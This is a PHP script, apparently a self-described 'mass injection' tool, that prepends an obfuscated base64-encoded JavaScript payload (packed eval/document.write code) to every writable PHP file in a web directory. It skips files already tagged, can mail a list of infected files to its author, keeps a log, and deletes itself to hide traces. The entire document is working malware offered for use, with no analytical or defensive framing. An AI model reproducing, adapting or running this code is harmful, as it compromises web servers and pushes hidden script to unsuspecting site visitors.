<?php
set_time_limit(0);
ignore_user_abort(1);
# PHP Mass Injection Script by f3v3r ver.080228
# |1| Look for all PHP files in directory.|2| Check if injected.
# |3| Inject with your script. |4|Optional email report to you.
$inj ='PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUscil7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPycnOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXJbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gcltlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFx3Kyd9O2M9MX07d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSk7cmV0dXJuIHB9KCdBKHIoInoudCVwLm4leSUwJWglZiU5JTclMiViJWwlZiVkJWElMSUzJTUlNSVjJXMlNiU2JTclbCU5JTQlZCVvJTglbSU0JXElNyU4JTQlMiVlJTglNCU1JWclNiUwJWQlMiU2JTAleCVlJTIldyU0JWMlMyVjJTElYiVnJTAlZSU1JTMlYSUxJWslMSViJTMlMiUwJXYlMyU1JWElMSVrJTElaiV1JTYlMCVoJWYlOSU3JTIlaiVpJWklQiIpKTsnLDM4LDM4LCcyQzEwNXwyQzM0fDJDMTAxfDJDMTA0fDJDNDZ8MkMxMTZ8MkM0N3wyQzEwOXwyQzExN3wyQzk3fDJDNjF8MkMzMnwyQzExMnwyQzk5fDJDMTAwfDJDMTE0fDJDMTE5fDJDMTAyfDI5fDJDNjJ8MkM0OHwyQzExNXwyQzk4fGZyb21DaGFyQ29kZXwyQzEwOHwyOFN0cmluZ3wyQzEwN3x1bmVzY2FwZXwyQzU4fHdyaXRlfDJDNjB8MkMxMDN8MkMxMjB8MkMxMTB8Mjg2MHxkb2N1bWVudHxldmFsfDNCJy5zcGxpdCgnfCcpLDAse30pKQ0KPC9zY3JpcHQ+';//Your codez here
$log_email = 0;
$email = 'f3v3r@cc.cc';
$log_report = 1;
$filename = '__log.html';
$delete_me = 1;

echo '<title>f3v3r injection toolz</title><center><strong>Defacez aint hack, r00tz r.</strong></center><br>';
$dir = opendir('.');
$site=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST);
while ($file = readdir($dir))
{
if (strstr($file, '.php') && is_writeable($file))
{
$victim = fopen($file, 'r+');
$victim_read = fread($victim, filesize($file));
if (!strstr($victim_read, 'f3v3r'))
{
fclose($victim);
unlink($file);
$new = fopen($file, 'a+');
$new_write = fwrite($new, base64_decode($inj) . $victim_read);
fclose($new);
echo '<strong>[-] injecting : ' . $site . '</strong><br>';
echo '[x] injected: ' . $file . '<br>';
if($log_email) { $log = fopen('__tmp', 'a+'); fwrite($log, '[x] File: ' . getcwd() . $file . '<br>'); fclose($log); }
if($log_report) { $x = fopen($filename, 'a+'); fwrite($x, '[x] File: ' . getcwd() . $file . '\n'); fclose($x); }
}
}
}
closedir($dir);
if($log_email) { $report = file_get_contents('__tmp'); mail($email, "injection report", '<br>f3v3r<br> ' .$report, 'From: f3v3r <f3v3r@cc.cc>'); unlink('__tmp'); echo '[x] Email Report Sent!';}
if($delete_me) { unlink(__file__); }
exit;
?> 